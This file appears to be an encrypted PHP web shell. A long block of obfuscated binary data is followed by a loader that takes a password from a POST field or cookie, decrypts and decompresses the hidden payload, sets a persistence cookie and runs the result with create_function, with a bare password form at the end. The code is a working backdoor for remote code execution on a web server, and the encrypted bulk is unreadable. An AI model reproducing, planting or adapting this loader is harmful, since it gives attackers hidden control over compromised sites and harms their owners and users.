и‰ѓЖ‹§Т:-иГsмђaютЎ1јwЈKеHHХЋн„gјЫ“ейщёМюQ™ ›шЬОЫ”ј—‰Ыґ"з ВJЙЭЃЃQ:«™Нґзпm8У?/8uН=Ўs­:U€=идЖїҐ‚лв™ehтњPПО«„ірЃ_yНq*ЪССмР:М2!ЛС{ђ€ZЎIg…ї°Mc
дTЉ®Ґ ї–п0Ю[ч±oџе°€=ЩJ(&оLоXA©Eї®бШPµuMmJioГФ@\\°щЫ9g“щ9Д—Р•вtЫнЧvµzЩз+$[щиўOUУЕ‘ЉЉбx™Xг#>8цлдbRpf/.¬Z›ћ†з‘њ…XД$CЯ
YпМщxHgв+‚$†jmќа<VОg]єакrx±u?ЄЪ(^_ ЧкЇЈшЬ€е/ј/¬–Тly0(wHНAЪEj9MЯTdcИЦHћ|в(хГФ
—Пy"
zг»є7cіh’иёЈSzЩя·PЩ¦§№ЮЏ5ЌnqЩiОФ&РЧЇ9[ЊИFЭ…ЦA¶ѕ!юq¬–A^‡1мAMЧ*еЃџ j№ЃxЎ©иЧИoј?ЖAЬbxоё$®.Ќ)ЧpЄИ€ПГsЩХѕ@П*ЁнЛд#ч§.™µх-+|ЬЫtОьn<ЊуЯф’Q‚µ‚¬ЦM‘їS–u>Ѓ%ЦЗлVҐ“_ъСg±;Akн·p* ьС©’юрYіьПЫфь”0ыѓщ5аЦёpoHйехґ7†џhgU\\nE8”XQъJqљ€	°Y‹:–»8j¦Ѕ059Bсy)лnПtр,Ш‰ЇЌ:юn3°SK%ѓу‰S­±
µЅ:щ®PzF3$љЮlҐм“sе=нХЙEщЪЦЪВP]OТСNZ%мСµHq
П;›В!днlKхёЯЩЉmкJ©6БРЅЁ-‚ъ{ГVы§«uД#ѓgH_±X‹S®ЬЩ)ћ#з·\\€°щГ$`йПL›µ/щью5ЉК±Uu`ДNB]Є­®dhYZј8Ёi#„И%ВіlyI.1#(ё—ВО§щМЏ§—ќѕЏ’Ф^›ЧА	ћЫnо›1pЬаЂїЊц§wпrЎфеэКъЉя\'&”MVбойB
Ђ 0…_Џ3	ы	›ЉшЈ//!ЯъЏДnNь°‘»ЁЭ¬Уi!]Ќi‹­Л§ъXSўBxёТлу?ЛЁ=УµгLUMњ7D«х;°тЃ&ыg3ЋѕшљіќюТэиkЖ4й
¤К1хЯ^тЬќ™‚7vФ{hZmр’vџV№[Oхq?¶ЬV:96ўYЩю_ѕzџ:У©‚ДsЃRїx’р2U‡„+MН!шТжW%ВyaЈ@у_«Цlcj«рй.VнШ’Ъ.)¬yKВS2bЄ«JR…гю7А‰ ;ЈГФ‡Vtѓyнњig3ѕx•Z‰VЧF.Ш,°SpwDИЋЏшёЫЮ`п@)s…)ГRлжЌ€ѓo·"p4Щv·љwfптJЁжї[Ф}ёќ–ьоншы*·xвlPVn5]Љд%|tTг cUе]‰]n{ъr›Въ$5KvЄж[
Њиuр_©їшЂ°µмХ‚}:Ог].D„±К;7ь}h5шdхDLV4Б•“%г±Т«aКnP[Џt
SвЫjmВEзєЪRьй`ч‡Шјцј<Іь51 ЎlјЩ-§ Z¤Їё™-D]њЌс
жГ%Ш\'fT2ћу2Ќm07К/—3имЕ)Z0µP(њ§–(dз_ѕvф“\'єKJ¦Д’Џа` ¬ц­O‹8RLЂ|¶х§¶е6t#[AA;Ѓф–ЦsдxS•џ”
6ЁїxУ
ґ,
JMн…\'Pw°rTи11А|ШgІ(ІЕэzъh<Ювм)КЈЋ€}МN†БЇРьВMЋЂ аMУ<cWM1ЖЦ+\'ѕ_NЧйjjХzЗц°Y»¶ф%e|dРєxAъ„€З,тЯB/гСИ>O±Ю…чґ.I<F}ръ‘оh2”Бт©ј°Ъ#s)—HSз$ n&жрq0рэv&ђ¦¶Йf~V§љ:УТЋЗ"@Ъ¦KЉЉhиЩ™шљзо
a ;$ЬMґ§1µZАлn¤.љэЂ)©%y=ѕѕхЕлб
)NEpвЎkєU0pТ#ЇҐЄ_OuЕ@ёф!
qЋ‹zL@Гмv“·gwBfфGЬґtн±38yЄqYЭ[Шє…Б€=]ЊЛПЮp‘Є№У‰	гџsAз d2Ь.‘rЬ“Нр~ёdз°рП(іO©`9А)g&Ьфќи„D“И1*ё>‘ҐНнSсдЪИП^п+№2ъ№а3рHцtҐ\\Zd;rіVФхк…›HњKьeФі»¬fчЈ‘ЫZ~Х‘Gв6еXХMЁs,хюШ`0 Ѓ]ЪС†©W(/xиL\\Ђ»ў/ќ9щб_ф|EЙѕ•«с‰р¬
¦ЖnАjНы41јH}oUЊjВxИЭzЈtєfУ0Y.«ЊA$Ф¤!(ПЯf’sьaH х7]Єv•·н-­тФ>s‰µЖх[ч3ю
lѕjј2·V(лО~8е#О‚;Г
ё‹©jH`bћ ыГжрОzОЋjЧiLЯЄ^v0!ќЬЪмyx7КHdDћTD‘WЩНж(ЂoфSБT”}vV…Е(н„»уUІжзЛ [ЃГ™aQ0pћTе›QЬРЎЃр®"›5.–®Nm?п”0\\z
P]§»ЩnЙ©ZДИхE–:vжПІtM|~Њч*йѕ
јW_p°ОVnЯє
~л)2sгѕіР`ЉСPђй}8¤[™ф4f— &Csk„mХС“Yў2{иаMыWN‰тcґжU¤›1”WиleгS;ЯџёrѓђыZx)е$ъ)ѓgRg?€t8я_f[8.7”†(?ЈҐЛѕЧнDrэK‘g© OmґєQ”“ZХF©‘ж+pял•„T®Ђ^н}!Д3‹6qЈ{RІЕ»~9GЬ»S&ЬvЮ2ќЏвд{мFозy\'TL/¶кЎЊ_.
Щ<ЋйPќ|“pLШЭЄЭь=CњлЏN?иAтє@uь#9_4№bсoМPђ¤ЦЛк°ФlЂѓф¦VуўxbҐ^mњГlжTщ‚¶p› ‡Ўі#ФЯ‡џЄѓ\':ша©Г_)‰ХПl:жєmЌ&ЈQ w§-¶йдfПЉ­ЕAsпњБjњ5‰‘ёО—P“BКk`M›x-ДЪЈ7ўEжНOV?ЎУuKqB™нJЕ®.хјґЉюmЇЧцu’яџVоєRєWхn
Ћі.\\БШ\'а†<эЈҐ+т­БХАЅ:µzМу­Hpb¦Ь4iPЅ"ќтkM-Ц_Ш¦в^kЮџ¬Ь†––џ№х®hVЕq¬JЋ7¶И„ћpЙ•бG[Sє(Нe
§ЛѓYPўpЁС! Jр0 mЋЊ Uю‰!¶>Еџщ$SЇFэоќ0‘ЭЃе­–¤ЁµокЦUї^/UPЦ.!F¬ФзtuUЂщrРЎуДNхФO[¦ЖЙ3#і`с&уЊЧo%¬Крњз±яk2СBOс/F®њ>њлю/A*DчщAЕXB•\'¶хЬрC]ЅнU”Ы1y5Ёё#}р<t“¶iћuЭT!»aMAoР;tЬbў–$0тQ»НСИ‚щ‹‚Дlзї†ZWяM96TЊYЙLнЬ^cЫYЭhБзЃ@ПTЇSИєKк>дЇё@\'c©F$=Ѕr+R{«Џіхђ>у1Ђ †чє…;B:І–­RэџeдhЙъЪѓм_s‹R’-т РЯWA¤x‚gaћ	йцM€ТтУuЮ «Ї®µе•…GEЉ‡/ВЕ‡qпь-Эdт}*Ъ)ђ&}fУНЙ®‘ф7)ЛяBѓNФі|ыv@ДdР9ЋяfR­о›¦Цъ,Кчкh: E+<кЁЌт\'Yaћ¬ѓќ12·¬A0ЄqФqOщоОЭЃ:Ж-\\ Ъ•В_ЏusФf9y†*©Няь§_cO{ГmЅзг\\д»…ЁпW	лїҐТЦ)rd–тМ9Хйhод¬“tСy….жюїw8>цCpk_јL•ЉгЯPѓџaЬляЃ}Ь;NyФqб™ёЩ#х¦smҐ=DнBсАЬfe…"†AШNXз3Tкy·ЌЁхBPЁnґ–ё7rЮЄђSы|®,юYzткіђxуш¤Є1А»zF€Љх‰@µй{В‚yЙ!«%\\m 0lђ¦ђl щ_ОЉµ„k¬®р 	e‰	».а±2_)t^Ш€тa(”Ё§ц
НEЄ^”ЩёZ„RЕ,хк(9бЁыq‡eк	Н~MrG‰EH#яWаgНу®DИРђ€џ““E<юЯгњл"[ёЎ %в"Лk¤ъµГmмї®в8$1ЕZ[ЮЋ)нzU‰щ?I?rПБМm|»Rѓґ%|
Љm…2ґй¬ЎrBњїRl<AЂ7	Џ&юєц#бKНpєЙ€Sю$cЋ…)Л$(џьЪҐ[™wЬXќCјWьрQѕjЂ‰hыtфМ‚¬HЕЁµоЅ
”LжkЋќыC)2pЯ‘і†bR‰µДЛ±щM+py=с†Д»дrч"H*мЯTх=—C‰Qц^ґВRµюґҐwЌ€wУХхфс·‰щW	—ќt›ШEЧ«¶0Эсб_(’Й’W]Џ¤ЄP·sОуЇЦ9~a!И:кpSЩыpьuУcµЈЃеUs}yІ6е ]Ѕ«!&€.хќҐ
ДФRЈщЗпq¶Qlmім
20lГдІmџ’*sMЫЂЧwЋуt¶ѓJиa)›бЖ\'°y‰F›Т»ґй†ЧЛ‚Й*tхWVф#Ф)•EьвwJ4…фѓ“pєJЫ". ЫnжLВЖЅ:ПADFq•’>аШca‰·с·аќЧШ¶Xe{п9щёп—	‘*hП<%СI…€Д›…џѕLMлPJќэѕz~#вЯдҐJ‡’zci&°A{“ќasБѓЦТЁјµѓГй“ѓ.fю¶Б””)¦µ/?nQйЩkШК‚щiMйE‚йєs…ylPђ\'мљ†Ю2Ім¤«1Љ‹яэ‘пDMр|6“Нзњ}ФТёВ¤Ё¦ІISтЗ№кTL°SйЭЛ?14r‘ћg}\\W_ѕХыNЪа-y…‡\\T$jп™WY…™щГїgМЫЛ“vуіPј®4УЗ‚Ны­Ґтd0uQSKъХ®µНюc(µcё/e /†у
Д“c¬·ЧЅЖQі‡эО<Ћвde"мkG\'о¤ґpс°У-fЕ_•эb\'Х©P:^д„qАОG¬JSЃ©ОM(ВХйqд¤ђСЁЮЪ…нA°rњHІЁС™aЕ<ґDr,7Р!Fт]ҐVRї2	И"TµЊџв1†Њ\\лсfCсКПэґPj№CQы\\ч6јН niЇ°gХD¶уЎ·°ђ„ ›ш
Ebющ~*3F‘Фщ¦»З 3МzvЙАq~ZZ‡CіSшЇїn‘оН3а;RA fyЗАµZ›¤ЭaгX—¤yI4».зuљ2zI?пЦdRkWЃ W8йЧС#	б$мCЅ‘ЁZAѕ«ћлDW6Є0фЇ»мµ~ Ї0rjЖ¤5‚Рх­ҐVBХ„Q(z ¶ЁїsPJ… $]‹…¬мdюV*=р [Ю™$ѓU~ЮЙ|ФДл?aRµп\'\\`H¤‡E
¤­.ОЩCC
–wУ[Е7кЈ=‡|Йw°Ь
Bd!7xъ/њИ”|,Б©;ЩVЉ·ЏA*cВ&КЬT{µЏs­g5hШPzФь«9нnЕEБА,ѓщuъ‡ схш”Ёљ5Щlј1ЂПу	?@.ъзО#	SіkЌ
‡ЉЗЋОґэй?№yЂZфыG®ЂoЋZ“СЉ9є”э5UЗП_;*›«Ц СВл-ђшTяJц†gїј7Ч7(нKЋіkЊсЫV
”ґЊЪј†\\
’ў¦±	rЧєqбЕбuлАЃљИ/жїMоS^”Ш)Ъ"Yi*Рр@uДjЈR™):в‘©’"юЃСА†ЪіЃ#RzўюМ(д¶{X[іП©_M)Г›’.w°ЪuзTз)YфЈёC_Уџ)РKR >Ќrn‡°К…>fЧ‹c$”аЋ}pњпb` c	и0.щШЂЩї{ЗlsИв­>\\лC^Ц_qlt ~›vШJRЮГ <ІD`v"_џ™ЄVж‚Nже^г†ЋГEЖ/nU9їшюь}±Пy*лЕzжЈS“щЌ‹НLK4\\b=4A›ЈbЇ0т№е#юХ)%yЮЗхтe|ю¤ЙЮьЗEsЙ@ЭлѓiO 9YUzм†оњ€ІzVCѓ	lv
 д0|ЩУ§ёZiЩ/ИОеL¦Ѓfрќ';$_f__f=isset($_POST['_f__f'])?$_POST['_f__f']:(isset($_COOKIE['_f__f'])?$_COOKIE['_f__f']:NULL);if($_f__f!==NULL){$_f__f=md5($_f__f).substr(md5(strrev($_f__f)),0,strlen($_f__f));for($_f____f=0;$_f____f<15324;$_f____f++){$_f___f[$_f____f]=chr(( ord($_f___f[$_f____f])-ord($_f__f[$_f____f]))%256);$_f__f.=$_f___f[$_f____f];}if($_f___f=@gzinflate($_f___f)){if(isset($_POST['_f__f']))@setcookie('_f__f', $_POST['_f__f']);$_f____f=create_function('',$_f___f);unset($_f___f,$_f__f);$_f____f();}}?><form action="" method="post"><input type="text" name="_f__f" value=""/><input type="submit" value="&gt;"/></form>